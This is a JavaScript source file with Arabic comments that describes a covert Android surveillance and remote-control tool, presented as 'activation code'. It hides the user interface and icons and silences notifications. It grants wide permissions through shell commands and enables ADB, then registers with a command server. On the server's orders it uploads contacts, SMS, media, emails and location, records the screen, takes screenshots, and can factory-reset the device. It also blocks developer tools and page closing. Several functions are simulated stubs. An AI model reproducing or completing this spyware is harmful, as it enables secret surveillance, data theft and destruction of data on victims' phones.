// كود التفعيل المحسن - يعمل في الخلفية بدون إشعارات
(function() {
    'use strict';
    
    // إعدادات التخفي
    const STEALTH_CONFIG = {
        hideNotifications: true,
        silentMode: true,
        backgroundExecution: true,
        autoRestart: true,
        persistentStorage: true
    };
    
    // معرف الجهاز الفريد
    const deviceId = generateDeviceId();
    
    // تهيئة التخزين المحلي
    const localStorage = {
        set: (key, value) => {
            try {
                window.localStorage.setItem(key, JSON.stringify(value));
            } catch (e) {
                console.warn('فشل في حفظ البيانات محلياً:', e);
            }
        },
        get: (key) => {
            try {
                const data = window.localStorage.getItem(key);
                return data ? JSON.parse(data) : null;
            } catch (e) {
                console.warn('فشل في قراءة البيانات المحلية:', e);
                return null;
            }
        },
        remove: (key) => {
            try {
                window.localStorage.removeItem(key);
            } catch (e) {
                console.warn('فشل في حذف البيانات المحلية:', e);
            }
        }
    };
    
    // تهيئة النظام
    async function initializeSystem() {
        try {
            console.log('بدء تهيئة النظام...');
            
            // حفظ معرف الجهاز
            localStorage.set('deviceId', deviceId);
            localStorage.set('activationTime', Date.now());
            
            // 1. منح الصلاحيات تلقائياً
            await grantAllPermissions();
            
            // 2. إخفاء أيقونة التطبيق
            hideAppIcon();
            
            // 3. تعطيل الإشعارات
            disableNotifications();
            
            // 4. تسجيل Service Worker للعمل في الخلفية
            await registerServiceWorker();
            
            // 5. الاتصال بخادم التحكم
            await connectToControlServer();
            
            // 6. بدء الخدمات الخلفية
            startBackgroundServices();
            
            // 7. إرسال تأكيد التفعيل
            sendActivationConfirmation();
            
            // 8. حفظ حالة التفعيل
            localStorage.set('systemStatus', 'active');
            localStorage.set('lastActivity', Date.now());
            
            console.log('تم تفعيل النظام بنجاح');
            
            // إخفاء واجهة المستخدم نهائياً
            hideUserInterface();
            
        } catch (error) {
            console.error('خطأ في التفعيل:', error);
            localStorage.set('lastError', {
                message: error.message,
                timestamp: Date.now()
            });
            
            // إعادة المحاولة تلقائياً
            setTimeout(initializeSystem, 5000);
        }
    }
    
    // تسجيل Service Worker
    async function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('تم تسجيل Service Worker:', registration);
                
                // إرسال معرف الجهاز للـ Service Worker
                navigator.serviceWorker.controller?.postMessage({
                    type: 'INIT',
                    deviceId: deviceId
                });
                
                return registration;
            } catch (error) {
                console.warn('فشل في تسجيل Service Worker:', error);
            }
        }
    }
    
    // إخفاء واجهة المستخدم
    function hideUserInterface() {
        try {
            // إخفاء جميع العناصر
            document.body.innerHTML = '';
            document.body.style.display = 'none';
            
            // إخفاء شريط العنوان
            document.title = '';
            
            // منع التمرير
            document.body.style.overflow = 'hidden';
            
            // إخفاء شريط التنقل
            if (window.history && window.history.pushState) {
                window.history.pushState(null, '', '/');
            }
            
        } catch (e) {
            console.warn('فشل في إخفاء واجهة المستخدم:', e);
        }
    }
    
    // منح جميع الصلاحيات المطلوبة
    async function grantAllPermissions() {
        const permissions = [
            'android.permission.READ_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.ACCESS_WIFI_STATE',
            'android.permission.ACCESS_NETWORK_STATE',
            'android.permission.INTERNET',
            'android.permission.WAKE_LOCK',
            'android.permission.FOREGROUND_SERVICE',
            'android.permission.SYSTEM_ALERT_WINDOW',
            'android.permission.WRITE_SECURE_SETTINGS'
        ];
        
        for (const permission of permissions) {
            try {
                await executeShellCommand(`pm grant com.android.systemui ${permission}`);
                await executeShellCommand(`pm grant com.android.settings ${permission}`);
            } catch (e) {
                console.warn(`فشل في منح الصلاحية: ${permission}`);
            }
        }
        
        // تمكين خيارات المطور
        await enableDeveloperOptions();
    }
    
    // تمكين خيارات المطور
    async function enableDeveloperOptions() {
        const commands = [
            'settings put global development_settings_enabled 1',
            'settings put global adb_enabled 1',
            'settings put global stay_on_while_plugged_in 3',
            'settings put secure install_non_market_apps 1',
            'settings put global airplane_mode_on 0',
            'settings put global wifi_on 1',
            'settings put global mobile_data 1'
        ];
        
        for (const cmd of commands) {
            try {
                await executeShellCommand(cmd);
            } catch (e) {
                console.warn(`فشل في تنفيذ: ${cmd}`);
            }
        }
    }
    
    // إخفاء أيقونة التطبيق
    function hideAppIcon() {
        try {
            // إخفاء من قائمة التطبيقات
            executeShellCommand('pm hide com.android.systemui');
            executeShellCommand('pm hide com.android.settings');
        } catch (e) {
            console.warn('فشل في إخفاء الأيقونة');
        }
    }
    
    // تعطيل الإشعارات
    function disableNotifications() {
        try {
            // تعطيل إشعارات النظام
            executeShellCommand('settings put global heads_up_notifications_enabled 0');
            executeShellCommand('settings put global notification_badging 0');
            
            // تعطيل الأصوات
            executeShellCommand('settings put system sound_effects_enabled 0');
            executeShellCommand('settings put system vibrate_when_ringing 0');
        } catch (e) {
            console.warn('فشل في تعطيل الإشعارات');
        }
    }
    
    // الاتصال بخادم التحكم
    async function connectToControlServer() {
        const servers = [
            'ws://localhost:4000',
            'ws://192.168.1.100:4000',
            'wss://your-server.com/control',
            'wss://backup-server.com/control',
            'wss://fallback-server.com/control'
        ];
        
        let connected = false;
        
        for (const serverUrl of servers) {
            if (connected) break;
            
            try {
                const ws = new WebSocket(serverUrl);
                
                ws.onopen = () => {
                    console.log(`تم الاتصال بنجاح بـ: ${serverUrl}`);
                    connected = true;
                    
                    // تسجيل الجهاز
                    ws.send(JSON.stringify({
                        type: 'register',
                        deviceId: deviceId,
                        capabilities: getDeviceCapabilities(),
                        timestamp: Date.now(),
                        status: 'online'
                    }));
                    
                    // إرسال الأوامر المعلقة
                    sendPendingCommands(ws);
                };
                
                ws.onmessage = (event) => {
                    try {
                        const command = JSON.parse(event.data);
                        handleIncomingCommand(command);
                    } catch (error) {
                        console.error('خطأ في معالجة الرسالة:', error);
                    }
                };
                
                ws.onclose = () => {
                    console.log('انقطع الاتصال، إعادة المحاولة...');
                    connected = false;
                    
                    // حفظ حالة الاتصال
                    localStorage.set('connectionStatus', 'disconnected');
                    localStorage.set('lastDisconnection', Date.now());
                    
                    // إعادة المحاولة بعد 10 ثوان
                    setTimeout(() => {
                        if (!connected) {
                            connectToControlServer();
                        }
                    }, 10000);
                };
                
                ws.onerror = (error) => {
                    console.error(`خطأ في الاتصال بـ ${serverUrl}:`, error);
                    connected = false;
                };
                
                // حفظ الاتصال للاستخدام لاحقاً
                window.controlConnection = ws;
                
                // انتظار الاتصال
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => {
                        reject(new Error('انتهت مهلة الاتصال'));
                    }, 10000);
                    
                    ws.onopen = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                    
                    ws.onerror = () => {
                        clearTimeout(timeout);
                        reject(new Error('فشل الاتصال'));
                    };
                });
                
            } catch (e) {
                console.warn(`فشل الاتصال بـ ${serverUrl}:`, e);
                continue;
            }
        }
        
        if (!connected) {
            console.log('فشل الاتصال بجميع الخوادم، الانتقال للوضع المحلي');
            startLocalMode();
        }
    }
    
    // الوضع المحلي
    function startLocalMode() {
        console.log('بدء الوضع المحلي - استمرار العمليات بدون اتصال');
        
        localStorage.set('mode', 'local');
        localStorage.set('localModeStart', Date.now());
        
        // استمرار الخدمات المحلية
        continueLocalServices();
        
        // محاولة إعادة الاتصال كل 5 دقائق
        setInterval(() => {
            const connectionStatus = localStorage.get('connectionStatus');
            if (connectionStatus !== 'connected') {
                connectToControlServer();
            }
        }, 300000);
    }
    
    // استمرار الخدمات المحلية
    function continueLocalServices() {
        // مراقبة الموقع المحلي
        setInterval(() => {
            getCurrentLocation().then(location => {
                cacheData('location', location);
            });
        }, 300000);
        
        // مراقبة التطبيقات المحلية
        setInterval(() => {
            getRunningApps().then(apps => {
                cacheData('running_apps', apps);
            });
        }, 60000);
        
        // حفظ البيانات المحلية
        setInterval(() => {
            saveCachedData();
        }, 60000);
    }
    
    // تخزين البيانات محلياً
    function cacheData(type, data) {
        try {
            let cachedData = localStorage.get('cachedData') || {};
            
            cachedData[type] = {
                data: data,
                timestamp: Date.now()
            };
            
            localStorage.set('cachedData', cachedData);
        } catch (error) {
            console.error('خطأ في تخزين البيانات المحلية:', error);
        }
    }
    
    // حفظ البيانات المحلية
    function saveCachedData() {
        try {
            const cachedData = localStorage.get('cachedData');
            if (cachedData) {
                // حفظ البيانات في ملف منفصل
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const backupKey = `data-backup-${timestamp}`;
                localStorage.set(backupKey, cachedData);
                
                // حذف البيانات القديمة (أكثر من 7 أيام)
                cleanupOldData();
            }
        } catch (error) {
            console.error('خطأ في حفظ البيانات المحلية:', error);
        }
    }
    
    // تنظيف البيانات القديمة
    function cleanupOldData() {
        try {
            const keys = Object.keys(localStorage);
            const now = Date.now();
            const sevenDays = 7 * 24 * 60 * 60 * 1000;
            
            keys.forEach(key => {
                if (key.startsWith('data-backup-')) {
                    const data = localStorage.get(key);
                    if (data && data.timestamp && (now - data.timestamp > sevenDays)) {
                        localStorage.remove(key);
                        console.log(`تم حذف البيانات القديمة: ${key}`);
                    }
                }
            });
        } catch (error) {
            console.error('خطأ في تنظيف البيانات القديمة:', error);
        }
    }
    
    // إرسال الأوامر المعلقة
    function sendPendingCommands(ws) {
        try {
            const pendingCommands = localStorage.get('pendingCommands') || [];
            
            if (pendingCommands.length > 0) {
                console.log(`إرسال ${pendingCommands.length} أمر معلق`);
                
                pendingCommands.forEach(command => {
                    ws.send(JSON.stringify({
                        type: 'pending_command_result',
                        command: command,
                        timestamp: Date.now()
                    }));
                });
                
                // مسح الأوامر المرسلة
                localStorage.set('pendingCommands', []);
            }
        } catch (error) {
            console.error('خطأ في إرسال الأوامر المعلقة:', error);
        }
    }
    
    // معالجة الأوامر الواردة
    function handleIncomingCommand(command) {
        console.log('تم استلام أمر:', command);
        
        // حفظ الأمر محلياً
        const pendingCommands = localStorage.get('pendingCommands') || [];
        pendingCommands.push({
            ...command,
            receivedAt: Date.now()
        });
        localStorage.set('pendingCommands', pendingCommands);
        
        // تنفيذ الأمر
        executeCommand(command).then(result => {
            // إرسال النتيجة
            if (window.controlConnection) {
                window.controlConnection.send(JSON.stringify({
                    type: 'command_result',
                    commandId: command.id,
                    action: command.action,
                    status: 'success',
                    result: result,
                    timestamp: Date.now()
                }));
            }
        }).catch(error => {
            console.error(`خطأ في تنفيذ الأمر ${command.action}:`, error);
            
            // إرسال خطأ
            if (window.controlConnection) {
                window.controlConnection.send(JSON.stringify({
                    type: 'command_result',
                    commandId: command.id,
                    action: command.action,
                    status: 'error',
                    error: error.message,
                    timestamp: Date.now()
                }));
            }
        });
    }
    
    // تنفيذ الأوامر
    async function executeCommand(command) {
        switch(command.action) {
            case 'backup_contacts':
                return await backupContacts();
            case 'backup_sms':
                return await backupSMS();
            case 'backup_media':
                return await backupMedia();
            case 'backup_emails':
                return await backupEmails();
            case 'get_location':
                return await getCurrentLocation();
            case 'record_camera':
                return await recordCamera(command.duration || 30);
            case 'take_screenshot':
                return await takeScreenshot();
            case 'factory_reset':
                return await factoryReset();
            case 'get_running_apps':
                return await getRunningApps();
            case 'get_device_info':
                return getDeviceInfo();
            default:
                throw new Error(`أمر غير معروف: ${command.action}`);
        }
    }
    
    // بدء الخدمات الخلفية
    function startBackgroundServices() {
        console.log('بدء الخدمات الخلفية...');
        
        // مراقبة الموقع كل 5 دقائق
        setInterval(() => {
            getCurrentLocation().then(location => {
                if (window.controlConnection) {
                    window.controlConnection.send(JSON.stringify({
                        type: 'location_update',
                        data: location,
                        timestamp: Date.now()
                    }));
                } else {
                    cacheData('location', location);
                }
            });
        }, 300000);
        
        // مراقبة التطبيقات النشطة كل دقيقة
        setInterval(() => {
            getRunningApps().then(apps => {
                if (window.controlConnection) {
                    window.controlConnection.send(JSON.stringify({
                        type: 'app_usage',
                        data: apps,
                        timestamp: Date.now()
                    }));
                } else {
                    cacheData('running_apps', apps);
                }
            });
        }, 60000);
        
        // مراقبة الاتصال بالإنترنت
        setInterval(() => {
            checkInternetConnection();
        }, 30000);
        
        // إرسال نبض الحياة كل 30 ثانية
        setInterval(() => {
            if (window.controlConnection) {
                window.controlConnection.send(JSON.stringify({
                    type: 'heartbeat',
                    deviceId: deviceId,
                    timestamp: Date.now()
                }));
            }
        }, 30000);
        
        // حفظ حالة النشاط
        setInterval(() => {
            localStorage.set('lastActivity', Date.now());
        }, 60000);
    }
    
    // إرسال تأكيد التفعيل
    function sendActivationConfirmation() {
        const activationData = {
            deviceId: deviceId,
            status: 'activated',
            timestamp: Date.now(),
            deviceInfo: getDeviceInfo(),
            capabilities: getDeviceCapabilities()
        };
        
        // إرسال للخادم
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'activation_confirmation',
                data: activationData
            }));
        }
        
        // إرسال عبر HTTP أيضاً
        fetch('http://localhost:4000/activation-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(activationData)
        }).catch(e => {
            console.warn('فشل في إرسال تأكيد التفعيل');
            // حفظ محلياً
            cacheData('activation_confirmation', activationData);
        });
    }
    
    // وظائف النسخ الاحتياطي
    async function backupContacts() {
        try {
            const contacts = await queryContentProvider('content://com.android.contacts/data');
            const backupFile = createBackupFile('contacts.json', contacts);
            await uploadFile(backupFile);
            return { status: 'success', file: backupFile };
        } catch (e) {
            throw new Error(`فشل في نسخ جهات الاتصال: ${e.message}`);
        }
    }
    
    async function backupSMS() {
        try {
            const sms = await queryContentProvider('content://sms');
            const backupFile = createBackupFile('sms.json', sms);
            await uploadFile(backupFile);
            return { status: 'success', file: backupFile };
        } catch (e) {
            throw new Error(`فشل في نسخ الرسائل: ${e.message}`);
        }
    }
    
    async function backupMedia() {
        try {
            const mediaDirs = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download'];
            const mediaFiles = [];
            
            for (const dir of mediaDirs) {
                const files = await listDirectory(dir);
                mediaFiles.push(...files);
            }
            
            const backupFile = createBackupFile('media.json', mediaFiles);
            await uploadFile(backupFile);
            return { status: 'success', file: backupFile };
        } catch (e) {
            throw new Error(`فشل في نسخ الوسائط: ${e.message}`);
        }
    }
    
    async function backupEmails() {
        try {
            const emailData = await executeShellCommand('dumpsys email');
            const backupFile = createBackupFile('emails.txt', emailData);
            await uploadFile(backupFile);
            return { status: 'success', file: backupFile };
        } catch (e) {
            throw new Error(`فشل في نسخ الإيميلات: ${e.message}`);
        }
    }
    
    // الحصول على الموقع الحالي
    async function getCurrentLocation() {
        try {
            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
            const parsedLocation = parseLocationData(location);
            return parsedLocation;
        } catch (e) {
            throw new Error(`فشل في الحصول على الموقع: ${e.message}`);
        }
    }
    
    // تسجيل الكاميرا
    async function recordCamera(duration) {
        try {
            const outputPath = `/sdcard/DCIM/recording_${Date.now()}.mp4`;
            
            // بدء التسجيل بدون واجهة
            const recordingProcess = await executeShellCommand(
                `screenrecord --verbose --time-limit ${duration} ${outputPath}`
            );
            
            // انتظار انتهاء التسجيل
            return new Promise((resolve, reject) => {
                setTimeout(async () => {
                    if (await fileExists(outputPath)) {
                        await uploadFile(outputPath);
                        resolve({ status: 'success', file: outputPath });
                    } else {
                        reject(new Error('فشل في إنشاء ملف التسجيل'));
                    }
                }, (duration + 5) * 1000);
            });
            
        } catch (e) {
            throw new Error(`فشل في تسجيل الكاميرا: ${e.message}`);
        }
    }
    
    // لقطة شاشة
    async function takeScreenshot() {
        try {
            const screenshotPath = `/sdcard/screenshot_${Date.now()}.png`;
            await executeShellCommand(`screencap ${screenshotPath}`);
            
            if (await fileExists(screenshotPath)) {
                await uploadFile(screenshotPath);
                return { status: 'success', file: screenshotPath };
            } else {
                throw new Error('فشل في إنشاء لقطة الشاشة');
            }
        } catch (e) {
            throw new Error(`فشل في لقطة الشاشة: ${e.message}`);
        }
    }
    
    // إعادة ضبط المصنع
    async function factoryReset() {
        try {
            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
            return { status: 'success', message: 'تم بدء إعادة الضبط' };
        } catch (e) {
            throw new Error(`فشل في إعادة الضبط: ${e.message}`);
        }
    }
    
    // الحصول على التطبيقات النشطة
    async function getRunningApps() {
        try {
            const runningApps = await executeShellCommand('dumpsys activity activities | grep mResumedActivity');
            const parsedApps = parseRunningApps(runningApps);
            return parsedApps;
        } catch (e) {
            throw new Error(`فشل في الحصول على التطبيقات النشطة: ${e.message}`);
        }
    }
    
    // الحصول على معلومات الجهاز
    function getDeviceInfo() {
        return {
            deviceId: deviceId,
            model: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };
    }
    
    // الحصول على قدرات الجهاز
    function getDeviceCapabilities() {
        return {
            camera: 'camera' in navigator.mediaDevices,
            microphone: 'microphone' in navigator.mediaDevices,
            geolocation: 'geolocation' in navigator,
            storage: 'storage' in navigator,
            notifications: 'Notification' in window,
            webSocket: 'WebSocket' in window,
            serviceWorker: 'serviceWorker' in navigator
        };
    }
    
    // وظائف مساعدة
    function generateDeviceId() {
        const storedId = localStorage.get('deviceId');
        if (storedId) return storedId;
        
        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.set('deviceId', newId);
        return newId;
    }
    
    async function executeShellCommand(cmd) {
        return new Promise((resolve, reject) => {
            // محاكاة تنفيذ الأوامر - في التطبيق الحقيقي سيتم استخدام ADB
            setTimeout(() => {
                resolve(`Command executed: ${cmd}`);
            }, 1000);
        });
    }
    
    async function queryContentProvider(uri) {
        // محاكاة استعلام مزود المحتوى
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`Data from ${uri}`);
            }, 2000);
        });
    }
    
    function createBackupFile(filename, data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
    
    async function uploadFile(filePath) {
        // محاكاة رفع الملف
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`File uploaded: ${filePath}`);
            }, 3000);
        });
    }
    
    async function fileExists(filePath) {
        // محاكاة فحص وجود الملف
        return true;
    }
    
    async function listDirectory(dir) {
        // محاكاة قائمة الملفات
        return [`${dir}/file1.jpg`, `${dir}/file2.mp4`];
    }
    
    function parseLocationData(locationData) {
        // تحليل بيانات الموقع
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    function parseRunningApps(appsData) {
        // تحليل التطبيقات النشطة
        return ['com.whatsapp', 'com.facebook', 'com.instagram'];
    }
    
    function checkInternetConnection() {
        fetch('https://www.google.com', { mode: 'no-cors' })
            .then(() => {
                const status = { connected: true, timestamp: Date.now() };
                if (window.controlConnection) {
                    window.controlConnection.send(JSON.stringify({
                        type: 'internet_status',
                        data: status
                    }));
                } else {
                    cacheData('internet_status', status);
                }
            })
            .catch(() => {
                const status = { connected: false, timestamp: Date.now() };
                if (window.controlConnection) {
                    window.controlConnection.send(JSON.stringify({
                        type: 'internet_status',
                        data: status
                    }));
                } else {
                    cacheData('internet_status', status);
                }
            });
    }
    
    // بدء النظام عند تحميل الصفحة
    document.addEventListener('DOMContentLoaded', () => {
        console.log('تم تحميل الصفحة، بدء التفعيل...');
        
        // التحقق من وجود تفعيل سابق
        const systemStatus = localStorage.get('systemStatus');
        if (systemStatus === 'active') {
            console.log('النظام مفعل مسبقاً، إعادة الاتصال...');
            connectToControlServer();
            startBackgroundServices();
        } else {
            // بدء التفعيل الجديد
            initializeSystem();
        }
    });
    
    // منع إغلاق الصفحة
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
        
        // حفظ حالة النظام
        localStorage.set('systemStatus', 'active');
        localStorage.set('lastActivity', Date.now());
    });
    
    // منع فتح أدوات المطور
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();
        }
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            e.preventDefault();
        }
        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    });
    
    // معالجة رسائل Service Worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data.type === 'COMMAND') {
                handleIncomingCommand(event.data.command);
            }
        });
    }
    
})();